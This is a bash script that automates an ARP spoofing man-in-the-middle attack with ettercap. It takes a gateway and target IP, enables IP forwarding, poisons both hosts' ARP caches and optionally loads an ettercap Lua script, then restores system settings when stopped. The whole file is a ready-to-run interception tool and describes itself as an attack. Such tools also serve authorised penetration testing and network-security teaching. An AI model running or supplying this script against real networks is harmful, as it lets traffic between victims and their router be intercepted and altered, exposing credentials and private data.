#!/bin/bash

# Check if script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

# Check for required parameters
if [ $# -lt 2 ]; then
  echo "Usage: $0 <gateway_ip> <target_ip> [lua_script]"
  echo "Example: $0 192.168.1.1 192.168.1.100 [script.lua]"
  exit 1
fi

GATEWAY_IP=$1
TARGET_IP=$2
LUA_SCRIPT=$3

# Function to cleanup and restore normal operation
cleanup() {
  echo -e "\n[+] Cleaning up and restoring normal network operation..."

  echo "$ALL_USE_TEMPADDR" > /proc/sys/net/ipv6/conf/all/use_tempaddr
  echo "$DEV_USE_TEMPADDR" > "/proc/sys/net/ipv6/conf/${DEFAULT_INTERFACE}/use_tempaddr"
  echo "$IP_FORWARDING" > /proc/sys/net/ipv4/ip_forward

  # Reset any iptables rules if necessary
  #iptables -F
  #iptables -X
  #iptables -t nat -F
  #iptables -t nat -X

  echo "[+] IP forwarding disabled"
  echo "[+] Exiting..."
  exit 0
}

# Trap Ctrl+C
trap cleanup SIGINT

# Get default interface
DEFAULT_INTERFACE=$(ip route | grep default | awk '{print $5}')

ALL_USE_TEMPADDR=$(cat /proc/sys/net/ipv6/conf/all/use_tempaddr)
DEV_USE_TEMPADDR=$(cat "/proc/sys/net/ipv6/conf/${DEFAULT_INTERFACE}/use_tempaddr")
IP_FORWARDING=$(cat /proc/sys/net/ipv4/ip_forward)

# Enable IP forwarding
echo "[+] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo 0 > /proc/sys/net/ipv6/conf/all/use_tempaddr
echo 0 > "/proc/sys/net/ipv6/conf/${DEFAULT_INTERFACE}/use_tempaddr"


# Construct ettercap command - note the // format for target specification
ETTERCAP_CMD="ettercap -T -q -i ${DEFAULT_INTERFACE} -M arp:remote /${GATEWAY_IP}// /${TARGET_IP}//"

# Add lua script if provided

if [ ! -z "$LUA_SCRIPT" ]; then
  LUA_SCRIPT="/usr/share/ettercap/lua/scripts/${LUA_SCRIPT}.lua"
  if [ -f "$LUA_SCRIPT" ]; then
    echo "[+] Using Lua script: $LUA_SCRIPT"
    ETTERCAP_CMD="$ETTERCAP_CMD --lua-script $LUA_SCRIPT"
  else
    echo "[!] Warning: Lua script '$LUA_SCRIPT' not found, exit !!"
    exit
  fi
fi

echo $ETTERCAP_CMD

# exit
# Display attack information
echo "[+] Initiating ARP spoofing attack:"
echo "    Gateway: $GATEWAY_IP"
echo "    Target: $TARGET_IP"
echo "    Interface: ${DEFAULT_INTERFACE}"
echo "[+] Press Ctrl+C to stop the attack and cleanup"

# Run ettercap
echo "[+] Starting Ettercap with command: $ETTERCAP_CMD"
eval $ETTERCAP_CMD

# If ettercap terminates on its own, call cleanup
cleanup
